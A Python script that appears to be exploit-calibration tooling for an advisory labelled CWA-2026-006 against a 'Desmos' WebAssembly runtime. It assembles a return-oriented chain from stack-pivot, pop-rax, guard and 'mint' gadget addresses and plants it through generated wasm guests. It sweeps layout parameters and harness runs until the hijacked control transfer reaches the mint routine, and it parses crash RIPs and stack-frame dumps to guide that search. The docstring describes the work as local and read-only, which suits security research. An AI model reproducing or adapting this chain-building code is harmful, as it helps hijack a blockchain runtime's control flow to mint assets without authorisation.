#!/usr/bin/env python3
"""recal.py — CWA-2026-006 Desmos re-calibration: shape-space sweep + diagnostics.

For a specific harness binary (gadgets + runtime addresses already derived), enumerate
the guest shape space that the PoC campaign identified as load-bearing, regenerate the
guests for each shape, run the harness a bounded number of times, and report which
shape lands the control transfer (M4BANK). Also supports a forensics pass
(-scanchain / -scandb-after) and a distinct-plant pass (a control transfer faults at
0x0000414100000000+k => the crossing happened and k = the slot).

Read-only local harness work; no chain interaction.
"""
import argparse, itertools, json, os, re, subprocess, sys

ap = argparse.ArgumentParser()
ap.add_argument('--gadgets', required=True)
ap.add_argument('--g0', required=True)
ap.add_argument('--cgocb', required=True)
ap.add_argument('--ud2', required=True)
ap.add_argument('--mint', required=True)
ap.add_argument('--harness', required=True)
ap.add_argument('--gen', required=True)
ap.add_argument('--wat2wasm', required=True)
ap.add_argument('--workdir', required=True)
ap.add_argument('--pivot', default='')
ap.add_argument('--poprax', default='')
ap.add_argument('--guard', default='')
# grid dimensions (comma lists)
ap.add_argument('--warmups-list', default='3')
ap.add_argument('--frame32-list', default='2')
ap.add_argument('--drops-list', default='15')
ap.add_argument('--offset-list', default='278')
ap.add_argument('--dummy-list', default='0')
ap.add_argument('--iters', type=int, default=66283)
ap.add_argument('--iters-list', default='')
ap.add_argument('--staged', type=int, default=10)
ap.add_argument('--plants', default='gadget')     # gadget|distinct|uniform
ap.add_argument('--attempts', type=int, default=3)
ap.add_argument('--max-shapes', type=int, default=0)
ap.add_argument('--timeout', type=int, default=60)
ap.add_argument('--diag', action='store_true')
ap.add_argument('--out', required=True)
a = ap.parse_args()

G = json.load(open(a.gadgets))
STAGED = a.staged


def pick_poprax():
    return G['pop_rax'][0][0] if G['pop_rax'] else None


def pick_guard():
    for want in (15, 0):
        for addr, text, xn, reg in G['guard_movups']:
            if xn == want and reg == 'ax':
                return addr
    for addr, text, xn, reg in G['guard_movups']:
        if reg == 'ax':
            return addr
    if G['guard_movq0']:
        return G['guard_movq0'][0][0]
    return None


POPRAX = int(a.poprax, 16) if a.pivot else pick_poprax()
GUARD = int(a.guard, 16) if a.pivot else pick_guard()
UD2 = int(a.ud2, 16)
MINT = int(a.mint, 16)
CGOCB = int(a.cgocb, 16)
G0 = int(a.g0, 16)
PIVOT = int(a.pivot, 16) if a.pivot else None
if PIVOT is None:
    # natural pivot: prefer poprbp with the largest usable base_local
    for kind, key in (('poprbp', 'pivot_add_poprbp'), ('ret', 'pivot_add_ret')):
        best = None
        for addr, text, *r in G[key]:
            m = re.search(r'add\s+\$0x([0-9a-f]+),%rsp', text)
            if not m:
                continue
            S = int(m.group(1), 16)
            if (S - 0x108) % 8:
                continue
            i = (S - 0x108) // 8
            if i < 6 or i > STAGED - 1:
                continue
            if best is None or i > best[1]:
                best = (addr, i, kind)
        if best:
            PIVOT, BASE_LOCAL, PKIND = best[0], best[1], best[2]
            break
else:
    BASE_LOCAL, PKIND = 9, 'poprbp'

if PIVOT is None or POPRAX is None or GUARD is None:
    print(json.dumps({'error': 'missing gadget', 'pivot': PIVOT, 'poprax': POPRAX, 'guard': GUARD}))
    sys.exit(1)


def holder_values():
    """PoC layout: after `add rsp,0x150; pop rbp; ret`, RSP lands on l9."""
    out = [0] * STAGED
    if PKIND == 'poprbp':
        chain = [(BASE_LOCAL, 0), (BASE_LOCAL - 1, POPRAX), (BASE_LOCAL - 2, G0),
                 (BASE_LOCAL - 3, GUARD), (BASE_LOCAL - 4, CGOCB),
                 (BASE_LOCAL - 5, UD2), (BASE_LOCAL - 6, MINT)]
    else:
        chain = [(BASE_LOCAL, POPRAX), (BASE_LOCAL - 1, G0), (BASE_LOCAL - 2, GUARD),
                 (BASE_LOCAL - 3, CGOCB), (BASE_LOCAL - 4, UD2), (BASE_LOCAL - 5, MINT)]
    for idx, v in chain:
        out[idx] = v
    return ','.join('%x' % x for x in out)


HV = holder_values()


def gen_guests(wd, frame32, drops, offset, dummy=0, iters=None):
    os.makedirs(wd, exist_ok=True)
    plant = a.plants
    cmd = [sys.executable, a.gen, wd,
           '--offset', str(offset), '--iters', str(iters if iters else a.iters),
           '--pre-call-drops', str(drops), '--frame32', str(frame32),
           '--dummy', str(dummy),
           '--staged', str(STAGED), '--bare-holder',
           '--plants', plant, '--plant-addr', '%x' % PIVOT,
           '--holder-values', HV]
    r = subprocess.run(cmd, capture_output=True, text=True)
    if r.returncode != 0:
        return False, r.stdout + r.stderr
    for g in ('holder', 'trigger', 'benign'):
        rr = subprocess.run([a.wat2wasm, os.path.join(wd, g + '.wat'),
                             os.path.join(wd, g + '.wasm')], capture_output=True, text=True)
        if rr.returncode != 0:
            return False, rr.stdout + rr.stderr
    return True, ''


def run_once(wd, warmups, tag, extra=None):
    out = os.path.join(wd, 'run-%s.json' % tag)
    cmd = [a.harness, '-wasm', os.path.join(wd, 'holder.wasm'),
           '-trigger', os.path.join(wd, 'trigger.wasm'),
           '-benign', os.path.join(wd, 'benign.wasm'),
           '-warmups', str(warmups), '-exec', '{}', '-gas', '10000000000000',
           '-tracenested', '-scandb-after', '132', '-out', out]
    if extra:
        cmd += extra
    try:
        r = subprocess.run(cmd, capture_output=True, text=True, timeout=a.timeout)
        rc, err = r.returncode, r.stderr
    except subprocess.TimeoutExpired as e:
        rc = 'timeout'
        err = (e.stderr.decode('utf-8', 'replace') if isinstance(e.stderr, bytes) else (e.stderr or ''))
    with open(os.path.join(wd, 'run-%s.stderr' % tag), 'w') as f:
        f.write(err)
    rip = ''
    m = re.search(r'CRASHDIAG sig=\d+ addr=0x([0-9a-f]+).*?RIP=0x([0-9a-f]+)', err, re.S)
    if m:
        rip = '0x' + m.group(2)
    mb = [l for l in err.splitlines() if 'M4BANK' in l][:1]
    return dict(exit=rc, m4bank=('M4BANK' in err), rip=rip, m4bank_line=(mb[0] if mb else ''),
                nested=[l for l in err.splitlines() if l.startswith('NESTEDRESULT')][:2])


def shapes():
    iters_list = [int(x) for x in (a.iters_list.split(',') if a.iters_list else [str(a.iters)])]
    for w, f, d, o, du, it in itertools.product(
            [int(x) for x in a.warmups_list.split(',')],
            [int(x) for x in a.frame32_list.split(',')],
            [int(x) for x in a.drops_list.split(',')],
            [int(x) for x in a.offset_list.split(',')],
            [int(x) for x in a.dummy_list.split(',')],
            iters_list):
        yield dict(warmups=w, frame32=f, drops=d, offset=o, dummy=du, iters=it)


def main():
    summary = dict(pivot='%x' % PIVOT, kind=PKIND, base_local=BASE_LOCAL,
                   poprax='%x' % POPRAX, guard='%x' % GUARD, g0='%x' % G0,
                   cgocb='%x' % CGOCB, ud2='%x' % UD2, mint='%x' % MINT,
                   holder_values=HV, iters=a.iters, staged=STAGED, plants=a.plants,
                   tried=[], best=None)

    # ---- diagnostics: distinct plants (does the crossing happen at all?) ----
    if a.diag:
        dwd = os.path.join(a.workdir, 'diag-distinct')
        ok, msg = gen_guests(dwd, 2, 15, 278)
        if ok:
            save = a.plants
            a.plants = 'distinct'
            ok, msg = gen_guests(dwd, 2, 15, 278)
            a.plants = save
        res = [run_once(dwd, 3, 'd%d' % i) for i in range(1, 4)] if ok else [dict(error=msg[-300:])]
        summary['diag_distinct'] = res
        # scanchain / scandb forensics
        swd = os.path.join(a.workdir, 'diag-scan')
        ok2, msg2 = gen_guests(swd, 2, 15, 278)
        if ok2:
            # (1) -scanchain WITHOUT -scandb-after => dumps the suspended coroutine frame
            #     chain (holder return slot / saved RBP) with offsets from the region top.
            try:
                r1 = subprocess.run([a.harness, '-wasm', os.path.join(swd, 'holder.wasm'),
                                     '-trigger', os.path.join(swd, 'trigger.wasm'),
                                     '-benign', os.path.join(swd, 'benign.wasm'),
                                     '-warmups', '3', '-exec', '{}', '-gas', '10000000000000',
                                     '-tracenested', '-scanchain',
                                     '-out', os.path.join(swd, 'scan.json')],
                                    capture_output=True, text=True, timeout=a.timeout)
                open(os.path.join(swd, 'scanchain.stderr'), 'w').write(r1.stderr)
                for ln in r1.stderr.splitlines():
                    if ln.startswith('CHAIN fiber') or ln.startswith('CHAINEXEC'):
                        summary.setdefault('chain_lines', []).append(ln[:300])
            except Exception:
                pass
            # (2) -scandb-after => PLANTSCAN at the crossing db_read
            try:
                r = subprocess.run([a.harness, '-wasm', os.path.join(swd, 'holder.wasm'),
                                    '-trigger', os.path.join(swd, 'trigger.wasm'),
                                    '-benign', os.path.join(swd, 'benign.wasm'),
                                    '-warmups', '3', '-exec', '{}', '-gas', '10000000000000',
                                    '-tracenested', '-scandb-after', '132', '-dumpall',
                                    '-out', os.path.join(swd, 'out2.json')],
                                   capture_output=True, text=True, timeout=a.timeout)
                open(os.path.join(swd, 'scan.stderr'), 'w').write(r.stderr)
                for ln in r.stderr.splitlines():
                    if ln.startswith('PLANTSCAN') or ln.startswith('CHAIN'):
                        summary.setdefault('scan_lines', []).append(ln[:400])
            except Exception:
                pass

    # ---- shape sweep ----
    n = 0
    for sh in shapes():
        if a.max_shapes and n >= a.max_shapes:
            break
        wd = os.path.join(a.workdir, 's-%d_%d_%d_%d_%d_%d' % (
            sh['warmups'], sh['frame32'], sh['drops'], sh['offset'], sh['dummy'], sh['iters']))
        ok, msg = gen_guests(wd, sh['frame32'], sh['drops'], sh['offset'], sh['dummy'], sh['iters'])
        if not ok:
            summary['tried'].append(dict(shape=sh, error='gen: ' + msg[-200:]))
            n += 1
            continue
        hits, results = 0, []
        for i in range(1, a.attempts + 1):
            r = run_once(wd, sh['warmups'], str(i))
            results.append(r)
            if r['m4bank']:
                hits += 1
        entry = dict(shape=sh, hits=hits, attempts=a.attempts,
                     exits=[r['exit'] for r in results],
                     rips=[r['rip'] for r in results if r['rip']])
        summary['tried'].append(entry)
        print('[recal] %s -> hits=%d/%d exits=%s rips=%s'
              % (json.dumps(sh), hits, a.attempts, entry['exits'], entry['rips']))
        n += 1
        if hits > 0:
            summary['best'] = entry
            break
    json.dump(summary, open(a.out, 'w'), indent=1)
    print('[recal] best = %s' % json.dumps(summary.get('best')))


if __name__ == '__main__':
    main()
